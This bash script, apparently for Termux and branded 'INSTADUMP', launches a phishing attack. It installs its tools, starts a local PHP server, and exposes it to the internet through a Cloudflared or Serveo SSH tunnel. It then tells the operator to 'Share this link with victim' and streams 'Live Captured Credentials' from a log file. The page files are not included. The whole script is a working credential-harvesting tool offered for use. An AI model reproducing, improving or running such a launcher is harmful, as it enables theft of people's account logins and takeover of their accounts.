#!/bin/bash

# Define color codes
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
NC="\033[0m" # No Color
reset="\033[0m"
yellow="\033[1;33m"
green="\033[1;32m"
red="\033[1;31m"
cyan="\033[1;36m"

# Auto install required packages
clear
echo -e "${GREEN}Installing required packages...${NC}"
pkg update -y > /dev/null 2>&1
pkg install php curl wget figlet -y > /dev/null 2>&1
command -v cloudflared >/dev/null 2>&1 || {
  echo -e "${YELLOW}Installing cloudflared...${NC}"
  pkg install cloudflared -y > /dev/null 2>&1
}

# Tool header
clear
echo -e "${CYAN}===========================================================================${NC}"

echo -e "
\033[1;35m██╗\033[1;31m███╗   ██╗\033[1;33m███████╗\033[1;35m████████╗ \033[1;34m█████╗ \033[1;35m██████╗ \033[1;31m██╗   ██╗\033[1;35m███╗   ███╗\033[1;34m██████╗
\033[1;35m██║\033[1;31m████╗  ██║\033[1;33m██╔════╝\033[1;35m╚══██╔══╝\033[1;34m██╔══██╗\033[1;35m██╔══██╗\033[1;31m██║   ██║\033[1;35m████╗ ████║\033[1;34m██╔══██╗
\033[1;35m██║\033[1;31m██╔██╗ ██║\033[1;33m███████╗\033[1;35m   ██║   \033[1;34m███████║\033[1;35m██║  ██║\033[1;31m██║   ██║\033[1;35m██╔████╔██║\033[1;34m██████╔╝
\033[1;35m██║\033[1;31m██║╚██╗██║\033[1;33m╚════██║\033[1;35m   ██║   \033[1;34m██╔══██║\033[1;35m██║  ██║\033[1;31m██║   ██║\033[1;35m██║╚██╔╝██║\033[1;34m██╔═══╝
\033[1;35m██║\033[1;31m██║ ╚████║\033[1;33m███████║\033[1;35m   ██║   \033[1;34m██║  ██║\033[1;35m██████╔╝\033[1;31m╚██████╔╝\033[1;35m██║ ╚═╝ ██║\033[1;34m██║
\033[1;35m╚═╝\033[1;31m╚═╝  ╚═══╝\033[1;33m╚══════╝\033[1;35m   ╚═╝   \033[1;34m╚═╝  ╚═╝\033[1;35m╚═════╝ \033[1;31m ╚═════╝ \033[1;35m╚═╝     ╚═╝\033[1;34m╚═╝
${NC}"

echo -e "${CYAN}===========================================================================${NC}"
echo -e "${GREEN}Welcome to INSTADUMP${NC}"
echo -e "${CYAN}=======================================${NC}"
echo -e "${GREEN}Created by Alok Thakur${NC}"
echo -e "${CYAN}=======================================${NC}"
echo -e "${GREEN}Subscribe channel: Firewall Breaker${NC}"
echo -e "${CYAN}=======================================${NC}"
echo
sleep 2

# Show captured credentials live (in red)
show_creds() {
  echo
  echo -e "${YELLOW}===== Live Captured Credentials =====${NC}"
  touch log.txt
  tail -f -n 0 log.txt | while read line; do
    echo -e "${RED}$line${NC}"
  done
}

# Tunnel Menu
echo -e "${yellow}[+] Choose Tunnel Option:${reset}"
echo -e "${green}1) Localhost (default)${reset}"
echo -e "${cyan}2) Cloudflared${reset}"
echo -e "${red}3) Serveo.net (SSH Tunnel)${reset}"
echo -ne "${yellow}Enter your choice [1-3]: ${reset}"
read opt
opt=${opt:-1}

# Start PHP Server
echo -e "${yellow}\n[+] Starting PHP server on localhost:8080${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 3

# Tunnel Setup
link=""
if [[ $opt == 2 ]]; then
    echo -e "${yellow}[+] Starting Cloudflared tunnel...${reset}"
    killall cloudflared >/dev/null 2>&1
    rm -f .clflog
    cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
    sleep 5

    echo -e "${yellow}[+] Fetching Cloudflared link...${reset}"
    for i in {1..15}; do
        link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog | head -n1)
        if [[ $link != "" ]]; then
            break
        fi
        sleep 1
    done

elif [[ $opt == 3 ]]; then
    echo -e "${yellow}[+] Starting Serveo.net (SSH Tunnel)...${reset}"
    killall ssh >/dev/null 2>&1
    rm -f .servolog
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
    sleep 7

    echo -e "${yellow}[+] Fetching public link from Serveo...${reset}"
    for i in {1..15}; do
        link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .servolog | head -n1)
        if [[ $link != "" ]]; then
            break
        fi
        sleep 1
    done

    if [[ $link == "" ]]; then
        echo -e "${red}[-] Serveo tunnel failed. Try again later.${reset}"
        exit 1
    fi
else
    link="http://localhost:8080"
fi

# Show Link
echo -e "\n${cyan}[+] Share this link with victim:${reset} ${green}$link${reset}"

# Start live credential monitoring
show_creds
